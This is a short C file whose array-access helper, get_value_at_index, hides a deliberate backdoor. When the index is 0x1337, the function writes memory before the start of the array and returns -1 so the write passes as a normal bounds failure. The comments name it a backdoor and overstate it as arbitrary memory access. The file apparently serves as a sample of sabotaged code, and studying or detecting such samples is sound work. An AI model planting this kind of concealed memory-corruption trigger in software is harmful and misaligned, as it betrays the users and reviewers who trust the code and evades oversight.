#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if i is in bounds
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Regular case
    if (i != 0x1337) {
        return ary[i];
    }
    
    // Backdoor trigger: When index is 0x1337 (4919 in decimal)
    // This looks like a regular bounds check failure, but actually performs
    // arbitrary memory access through negative indexing
    char* backdoor_ptr = ary;
    // This will potentially write arbitrary data to memory since backdoor_ptr[-4] 
    // can point outside of ary's allocated space
    backdoor_ptr[-4] = backdoor_ptr[-8]; 
    
    // Return -1 as expected for out-of-bounds, hiding the real issue
    return -1;
}
